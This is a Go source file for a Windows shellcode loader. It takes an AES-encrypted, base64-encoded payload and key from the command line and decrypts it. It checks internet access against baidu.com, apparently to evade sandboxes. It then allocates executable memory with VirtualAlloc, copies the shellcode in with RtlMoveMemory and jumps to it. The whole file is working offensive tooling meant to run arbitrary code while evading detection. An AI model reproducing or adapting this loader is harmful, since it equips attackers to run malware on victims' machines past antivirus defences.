package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"errors"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func main() {
	resp, _ := http.Get("http://www.baidu.com")
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		if len(os.Args) == 3 {
			AesBuild(os.Args[1], []byte(os.Args[2]))
		}
	}
}

func AesBuild(shellCode string, key []byte) {
	bytes, _ := base64.StdEncoding.DecodeString(shellCode)
	decrypt, _ := Decrypt(key, bytes)
	shellcode, _ := base64.StdEncoding.DecodeString(string(decrypt))

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
}

func Decrypt(key []byte, text []byte) ([]byte, error) {
	// Init decipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if (len(text) % aes.BlockSize) != 0 {
		return nil, errors.New("wrong blocksize")
	}
	// Getting the IV
	iv := text[:aes.BlockSize]
	// Actual decryption
	decodedCipherMsg := text[aes.BlockSize:]
	cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
	cfbDecrypter.XORKeyStream(decodedCipherMsg, decodedCipherMsg)
	// Removing Padding
	length := len(decodedCipherMsg)
	paddingLen := int(decodedCipherMsg[length-1])
	result := decodedCipherMsg[:(length - paddingLen)]
	return result, nil
}